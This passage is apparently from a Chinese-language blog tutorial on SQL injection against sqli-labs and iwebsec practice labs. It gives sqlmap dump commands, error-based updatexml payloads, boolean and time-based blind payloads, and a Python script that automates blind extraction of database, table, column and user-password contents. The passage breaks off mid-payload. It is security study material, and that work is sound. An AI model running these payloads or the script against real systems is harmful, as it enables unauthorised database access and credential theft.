class="comment">#其中参数“-C”用于指定字段名称，参数“—dump”用于导出数据</span></span><br><span class="line">-----------------------------------------------------</span><br><span class="line">python sqlmap.py -r C:\Users\caicq\Desktop\123.txt</span><br><span class="line"><span class="comment">#其中“-r”参数用于指定注入点的导出流量包的绝对路经文件</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -r C:\Users\caicq\Desktop\123.txt --dbs</span><br><span class="line"><span class="comment">#，其中参数“--dbs”用于列举数据库。</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -r 123.txt -D iwebsec --tables</span><br><span class="line"><span class="comment">#其中参数“-D”用于指定数据库名称，“--tables”参数用于列举表。</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -r 123.txt -D iwebsec -T user --columns</span><br><span class="line"><span class="comment">#其中参数“-T”用于指定表名称，“--columns”参数用于指定列出表中字段。</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -r 123.txt -D iwebsec -T user -C <span class="built_in">id</span>,password,username --dump</span><br><span class="line"><span class="comment">#其中参数“-C”用于指定字段名称，参数“—dump”用于导出数据</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>  <img src="https://secure2.wostatic.cn/static/gyaqtCkE6DWVjrWMgyajGw/image.png?auth_key=1678978523-ePtDzeSdAWSTAW12g8SDQ8-0-3abc3ece0bcc66983313d91104d081ce"></p>
+<h3 id="sql报错注入"><a href="#sql报错注入" class="headerlink" title="sql报错注入"></a>sql报错注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master(v2.0)/Less-5/?<span class="built_in">id</span>=1</span><br><span class="line">第一步：求闭合</span><br><span class="line">Less-5/?<span class="built_in">id</span>=1 and 1=1 -- -</span><br><span class="line">Less-5/?<span class="built_in">id</span>=1 and 1=2 -- -</span><br><span class="line">Less-5/?<span class="built_in">id</span>=1<span class="string">&#x27; and 1=2 -- -</span></span><br><span class="line"><span class="string">Less-5/?id=1&#x27;</span> and 1=1 -- -</span><br><span class="line">---------------------------</span><br><span class="line">第二步：求列数</span><br><span class="line">Less-5/?<span class="built_in">id</span>=1<span class="string">&#x27; and 1=1 order by 1,2,3 -- -</span></span><br><span class="line"><span class="string">--------------------------------</span></span><br><span class="line"><span class="string">第三步：如果判断出页面有报错信息，可以使用报错注入</span></span><br><span class="line"><span class="string">Less-5/?id=1&#x27;</span> and updatexml(1,concat(0x7e,(<span class="keyword">select</span> @@version),0x7e),1) -- -</span><br><span class="line">/Less-5/?<span class="built_in">id</span>=1<span class="string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)-- -</span></span><br><span class="line"><span class="string">---------------------------------------</span></span><br><span class="line"><span class="string">Less-5/?id=1&#x27;</span> and updatexml(1,concat(0x7e,(<span class="keyword">select</span> (table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 0,1),0x7e),1)-- -</span><br><span class="line">Less-5/?<span class="built_in">id</span>=1<span class="string">&#x27; and updatexml(1,concat(0x7e,(select (table_name) from information_schema.tables where table_schema=database() limit 1,1),0x7e),1)-- -</span></span><br><span class="line"><span class="string">Less-5/?id=1&#x27;</span> and updatexml(1,concat(0x7e,(<span class="keyword">select</span> (table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 2,1),0x7e),1)-- -</span><br><span class="line">Less-5/?<span class="built_in">id</span>=1<span class="string">&#x27; and updatexml(1,concat(0x7e,(select (table_name) from information_schema.tables where table_schema=database() limit 3,1),0x7e),1)-- -</span></span><br><span class="line"><span class="string">---------------------------------------------------</span></span><br><span class="line"><span class="string">Less-5/?id=1&#x27;</span> and updatexml(1,concat(0x7e,(<span class="keyword">select</span> (column_name) from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">&quot;users&quot;</span> <span class="built_in">limit</span> 4,1),0x7e),1)-- -</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">Less-5/?<span class="built_in">id</span>=1<span class="string">&#x27; and updatexml(1,concat(0x7e,(select concat(username,0x23,password) from users limit 3,1),0x7e),1)-- -</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="sql的bool盲注入"><a href="#sql的bool盲注入" class="headerlink" title="sql的bool盲注入"></a>sql的bool盲注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">/Less-7/?<span class="built_in">id</span>=1</span><br><span class="line">/Less-7/?<span class="built_in">id</span>=1<span class="string">&#x27;)) and 1=2 -- -</span></span><br><span class="line"><span class="string">-------------------------------</span></span><br><span class="line"><span class="string">/Less-7/?id=1&#x27;</span>)) and 1=1 order by 1,2,3  -- -</span><br><span class="line">---------------------------</span><br><span class="line">发现页面即没有显示位置又没有报错信息</span><br><span class="line">不能通过**union查询**也不能通过**报错注入**</span><br><span class="line">是不是存在盲注？？？</span><br><span class="line">-------------------------------</span><br><span class="line">/Less-7/?<span class="built_in">id</span>=1<span class="string">&#x27;)) and 1=2-- -     </span></span><br><span class="line"><span class="string">/Less-7/?id=1&#x27;</span>)) and 1=1-- -    </span><br><span class="line">发现页面会又两种不同的显示--初步判断是 bool盲注  </span><br><span class="line">--------------------------- </span><br><span class="line">判断数据库的长度   security</span><br><span class="line">/Less-7/?<span class="built_in">id</span>=1<span class="string">&#x27;)) and 1=1 and length(database())&gt;=8-- -</span></span><br><span class="line"><span class="string">------------------------------------------</span></span><br><span class="line"><span class="string">判断数据库的第一个字母是什么</span></span><br><span class="line"><span class="string">/Less-7/?id=1&#x27;</span>)) and 1=1 and left(database(),1)=<span class="string">&#x27;s&#x27;</span> -- - </span><br><span class="line">/Less-7/?<span class="built_in">id</span>=1<span class="string">&#x27;)) and 1=1 and left(database(),2)=&#x27;</span>se<span class="string">&#x27; -- - </span></span><br><span class="line"><span class="string">/Less-7/?id=1&#x27;</span>)) and 1=1 and left(database(),3)=<span class="string">&#x27;s&#x27;</span> -- - </span><br><span class="line">/Less-7/?<span class="built_in">id</span>=1<span class="string">&#x27;)) and 1=1 and left(database(),3)=&#x27;</span>sec<span class="string">&#x27; -- - </span></span><br><span class="line"><span class="string">--------------------------------------</span></span><br><span class="line"><span class="string">猜测表 emails  referers</span></span><br><span class="line"><span class="string">/Less-7/?id=1&#x27;</span>)) and 1=1 and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit a,<span class="number">1</span>),b,<span class="number">1</span>))&gt;n</span><br><span class="line">a是从0开始第几个表，b是为第几个字符，n是ASCII所对应的十进制数</span><br><span class="line">substr(<span class="string">&quot;abc&quot;</span>,1,1) 切割函数  从第一位开始切割 切割第一个 返回a</span><br><span class="line">substr(<span class="string">&quot;abc&quot;</span>,2,1) 切割函数  从第一位开始切割 切割第一个 返回b</span><br><span class="line">substr(<span class="string">&quot;abc&quot;</span>,1,2) 从第一位开始切割 切割两位 返回ab</span><br><span class="line">substr(<span class="string">&quot;abc&quot;</span>,0,1)  <span class="comment">#在PHP中是从0开始，MySQL中是从1开始</span></span><br><span class="line">第一个表</span><br><span class="line">/Less-7/?<span class="built_in">id</span>=1<span class="string">&#x27;)) and 1=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101-- -</span></span><br><span class="line"><span class="string">---------------------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">:copyright: Copyright (c) 2021, Fancy Xiang. All rights reserved.</span></span><br><span class="line"><span class="string">:license: GNU General Public License v3.0, see LICENSE for more details.</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master(v2.0)/Less-7/&quot;</span>               <span class="comment">#有可利用漏洞的url，根据实际情况填写</span></span><br><span class="line">headers=&#123; <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36&quot;</span>,&#125;    <span class="comment">#http request报文头部，根据实际情况填写</span></span><br><span class="line"> </span><br><span class="line">keylist = [chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(33, 127)]                                     <span class="comment">#包括数字、大小写字母、可见特殊字符</span></span><br><span class="line">flag = <span class="string">&#x27;You are in&#x27;</span>                                        <span class="comment">#用于判断附加sql语句为真的字符，根据网页回显填写</span></span><br><span class="line"> </span><br><span class="line">def CurrentDatabase7():</span><br><span class="line">    n = 10                                                                      <span class="comment">#预测当前数据库名称最大可能的长度，根据实际情况填写</span></span><br><span class="line">    k = 0</span><br><span class="line">    j = n//2 </span><br><span class="line">    length = 0</span><br><span class="line">    db = str()</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        <span class="keyword">if</span> j&gt;k and j&lt;n and j-k&gt;3:</span><br><span class="line">            payload1 = <span class="string">&quot;1&#x27;)) and length(database())&gt;&quot;</span>+str(j)+<span class="string">&quot;-- ss&quot;</span>           <span class="comment">#所有payload根据实际情况填写</span></span><br><span class="line">            param = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>:payload1,</span><br><span class="line">            &#125;</span><br><span class="line">            response = requests.get(url, params = param, headers = headers)     <span class="comment">#GET方法发送含payload的request</span></span><br><span class="line">            <span class="comment">#print(response.request.headers)</span></span><br><span class="line">            <span class="comment">#print(response.text)</span></span><br><span class="line">            <span class="keyword">if</span> response.text.find(flag) != -1:</span><br><span class="line">                n=n</span><br><span class="line">                k=j</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                k=k</span><br><span class="line">                n=j</span><br><span class="line">            j=(n-k)//2</span><br><span class="line">        <span class="keyword">elif</span> j-k==3 or j-k&lt;3:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(k-1,n+2):</span><br><span class="line">                payload2 = <span class="string">&quot;1&#x27;)) and length(database())=&quot;</span>+str(i)+<span class="string">&quot;-- ss&quot;</span></span><br><span class="line">                param = &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>:payload2,</span><br><span class="line">                &#125;</span><br><span class="line">                response = requests.get(url, params = param, headers = headers)</span><br><span class="line">                <span class="keyword">if</span> response.text.find(flag) != -1:</span><br><span class="line">                    length = i</span><br><span class="line">                    <span class="built_in">break</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the name of current database contains &quot;</span>+str(length)+<span class="string">&quot; characters&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(1,length+1):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> keylist:</span><br><span class="line">            payload3 = <span class="string">&quot;1&#x27;)) and substring(database(),&quot;</span>+str(i)+<span class="string">&quot;,1)=&#x27;&quot;</span>+c+<span class="string">&quot;&#x27;-- ss&quot;</span></span><br><span class="line">            param = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>:payload3,</span><br><span class="line">            &#125;</span><br><span class="line">            response = requests.get(url, params = param, headers = headers)</span><br><span class="line">            <span class="keyword">if</span> response.text.find(flag) != -1:</span><br><span class="line">                db = db+c</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the name of current database is &quot;</span>+str(db))</span><br><span class="line">    </span><br><span class="line">def Tables7():</span><br><span class="line">    n = 100                                                                     <span class="comment">#预测当前数据库中所有表名称最大可能的长度，根据实际情况填写</span></span><br><span class="line">    k = 0</span><br><span class="line">    j = n//2</span><br><span class="line">    length = 0</span><br><span class="line">    tname = str()</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        <span class="keyword">if</span> j&gt;k and j&lt;n and j-k&gt;3:</span><br><span class="line">            payload4 = <span class="string">&quot;1&#x27;)) and (length((select group_concat(table_name) from information_schema.tables where table_schema = database())))&gt;&quot;</span>+str(j)+<span class="string">&quot;-- ss&quot;</span></span><br><span class="line">            param = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>:payload4,</span><br><span class="line">            &#125;</span><br><span class="line">            response = requests.get(url, params = param, headers = headers)</span><br><span class="line">            <span class="keyword">if</span> response.text.find(flag) != -1:</span><br><span class="line">                n=n</span><br><span class="line">                k=j</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                k=k</span><br><span class="line">                n=j</span><br><span class="line">            j=(n-k)//2</span><br><span class="line">        <span class="keyword">elif</span> j-k==3 or j-k&lt;3:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(k-1,n+2):</span><br><span class="line">                payload5 = <span class="string">&quot;1&#x27;)) and (length((select group_concat(table_name) from information_schema.tables where table_schema = database())))=&quot;</span>+str(i)+<span class="string">&quot;-- ss&quot;</span></span><br><span class="line">                param = &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>:payload5,</span><br><span class="line">                &#125;</span><br><span class="line">                response = requests.get(url, params = param, headers = headers)</span><br><span class="line">                <span class="keyword">if</span> response.text.find(flag) != -1:</span><br><span class="line">                    length = i</span><br><span class="line">                    <span class="built_in">break</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the name of all tables in current database contains &quot;</span>+str(length)+<span class="string">&quot; characters&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(1,length+1):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> keylist:</span><br><span class="line">            payload6 = <span class="string">&quot;1&#x27;)) and substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),&quot;</span>+str(i)+<span class="string">&quot;,1)=&#x27;&quot;</span>+c+<span class="string">&quot;&#x27;-- ss&quot;</span></span><br><span class="line">            param = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>:payload6,</span><br><span class="line">            &#125;</span><br><span class="line">            response = requests.get(url, params = param, headers = headers)</span><br><span class="line">            <span class="keyword">if</span> response.text.find(flag) != -1:</span><br><span class="line">                tname = tname+c</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the name of all tables in current database is &quot;</span>+str(tname))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def Columns7(table):                                                          <span class="comment">#table参数是需要爆破的数据表名称，记得加单引号</span></span><br><span class="line">    n = 200                                                                     <span class="comment">#预测某个表所有列名称最大可能的长度，根据实际情况填写</span></span><br><span class="line">    k = 0</span><br><span class="line">    j = n//2</span><br><span class="line">    length = 0</span><br><span class="line">    cname = str()</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        <span class="keyword">if</span> j&gt;k and j&lt;n and j-k&gt;3:</span><br><span class="line">            payload7 = <span class="string">&quot;1&#x27;)) and (length((select group_concat(column_name) from information_schema.columns where table_name = &#x27;&quot;</span>+table+<span class="string">&quot;&#x27; and table_schema = database())))&gt;&quot;</span>+str(j)+<span class="string">&quot;-- ss&quot;</span></span><br><span class="line">            param = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>:payload7,</span><br><span class="line">            &#125;</span><br><span class="line">            response = requests.get(url, params = param, headers = headers)</span><br><span class="line">            <span class="keyword">if</span> response.text.find(flag) != -1:</span><br><span class="line">                n=n</span><br><span class="line">                k=j</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                k=k</span><br><span class="line">                n=j</span><br><span class="line">            j=(n-k)//2</span><br><span class="line">        <span class="keyword">elif</span> j-k==3 or j-k&lt;3:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(k-1,n+2):</span><br><span class="line">                payload8 = <span class="string">&quot;1&#x27;)) and (length((select group_concat(column_name) from information_schema.columns where table_name = &#x27;&quot;</span>+table+<span class="string">&quot;&#x27; and table_schema = database())))=&quot;</span>+str(i)+<span class="string">&quot;-- ss&quot;</span></span><br><span class="line">                param = &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>:payload8,</span><br><span class="line">                &#125;</span><br><span class="line">                response = requests.get(url, params = param, headers = headers)</span><br><span class="line">                <span class="keyword">if</span> response.text.find(flag) != -1:</span><br><span class="line">                    length = i</span><br><span class="line">                    <span class="built_in">break</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the name of all columns in current table contains &quot;</span>+str(length)+<span class="string">&quot; characters&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(1,length+1):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> keylist:</span><br><span class="line">            payload9 = <span class="string">&quot;1&#x27;)) and substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;&quot;</span>+table+<span class="string">&quot;&#x27; and table_schema = database()),&quot;</span>+str(i)+<span class="string">&quot;,1)=&#x27;&quot;</span>+c+<span class="string">&quot;&#x27;-- ss&quot;</span></span><br><span class="line">            param = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>:payload9,</span><br><span class="line">            &#125;</span><br><span class="line">            response = requests.get(url, params = param, headers = headers)</span><br><span class="line">            <span class="keyword">if</span> response.text.find(flag) != -1:</span><br><span class="line">                cname = cname+c</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the name of all columns in current table is &quot;</span>+str(cname))</span><br><span class="line"> </span><br><span class="line">def Content7(table,col1,col2):                                                <span class="comment">#table参数是需要爆破的数据表名称，col1和col2是需要爆破内容的列，记得都要加单引号</span></span><br><span class="line">    n = 200                                                                     <span class="comment">#预测期望获取的数据的最大可能的长度，根据实际情况填写</span></span><br><span class="line">    k = 0</span><br><span class="line">    j = n//2</span><br><span class="line">    length = 0</span><br><span class="line">    content = str()</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        <span class="keyword">if</span> j&gt;k and j&lt;n and j-k&gt;3:</span><br><span class="line">            payload10 = <span class="string">&quot;1&#x27;)) and (length((select group_concat(concat(&quot;</span>+col1+<span class="string">&quot;,&#x27;^&#x27;,&quot;</span>+col2+<span class="string">&quot;)) from &quot;</span>+table+<span class="string">&quot;)))&gt;&quot;</span>+str(j)+<span class="string">&quot;-- ss&quot;</span></span><br><span class="line">            param = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>:payload10,</span><br><span class="line">            &#125;</span><br><span class="line">            response = requests.get(url, params = param, headers = headers)</span><br><span class="line">            <span class="keyword">if</span> response.text.find(flag) != -1:</span><br><span class="line">                n=n</span><br><span class="line">                k=j</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                k=k</span><br><span class="line">                n=j</span><br><span class="line">            j=(n-k)//2</span><br><span class="line">        <span class="keyword">elif</span> j-k==3 or j-k&lt;3:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(k-1,n+2):</span><br><span class="line">                payload11 = <span class="string">&quot;1&#x27;)) and (length((select group_concat(concat(&quot;</span>+col1+<span class="string">&quot;,&#x27;^&#x27;,&quot;</span>+col2+<span class="string">&quot;)) from &quot;</span>+table+<span class="string">&quot;)))=&quot;</span>+str(i)+<span class="string">&quot;-- ss&quot;</span></span><br><span class="line">                param = &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>:payload11,</span><br><span class="line">                &#125;</span><br><span class="line">                response = requests.get(url, params = param, headers = headers)</span><br><span class="line">                <span class="keyword">if</span> response.text.find(flag) != -1:</span><br><span class="line">                    length = i</span><br><span class="line">                    <span class="built_in">break</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the content contains &quot;</span>+str(length)+<span class="string">&quot; characters&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(1,length+1):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> keylist:</span><br><span class="line">            payload12 = <span class="string">&quot;1&#x27;)) and substr((select group_concat(concat(&quot;</span>+col1+<span class="string">&quot;,&#x27;^&#x27;,&quot;</span>+col2+<span class="string">&quot;)) from &quot;</span>+table+<span class="string">&quot;),&quot;</span>+str(i)+<span class="string">&quot;,1)=&#x27;&quot;</span>+c+<span class="string">&quot;&#x27;-- ss&quot;</span></span><br><span class="line">            param = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>:payload12,</span><br><span class="line">            &#125;</span><br><span class="line">            response = requests.get(url, params = param, headers = headers)</span><br><span class="line">            <span class="keyword">if</span> response.text.find(flag) != -1:</span><br><span class="line">                content = content+c</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the content is &quot;</span>+str(content))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CurrentDatabase7()</span><br><span class="line">Tables7()</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+
+<h3 id="sql时间盲注"><a href="#sql时间盲注" class="headerlink" title="sql时间盲注"></a>sql时间盲注</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/Less-9/?<span class="built_in">id</span>=1<span class="string">&#x27; and 1=1 -- -</span></span><br><span class="line"><span class="string">无论怎么闭合，发现页面都是一样的，没有任何变化</span></span><br><span class="line"><span class="string">union 注入 报错注入和bool盲注都无法使用</span></span><br><span class="line"><span class="string">------------------------------</span></span><br><span class="line"><span class="string">/Less-9/?id=1&#x27;</span> and 1=1 and <span class="built_in">sleep</span>(3)-- -</span><br><span class="line">/Less-9/?<span class="built_in">id</span>=1<span class="string">&#x27; and 1=2 and sleep(3)-- -</span></span><br><span class="line"><span class="string">发现and 1=1 和 and 1=2 页面回显时间不一样</span></span><br><span class="line"><span class="string">------------------------------</span></span><br><span class="line"><span class="string">/Less-9/?id=1&#x27;</span> and 1=1 and <span class="keyword">if</span>(length(database())=6,<span class="built_in">sleep</span>(2),0)-- -</span><br><span class="line">/Less-9/?<span class="built_in">id</span>=1<span class="string">&#x27; and 1=1 and if(length(database())=7,sleep(2),0)-- -</span></span><br><span class="line"><span class="string">/Less-9/?id=1&#x27;</span> and 1=1 and 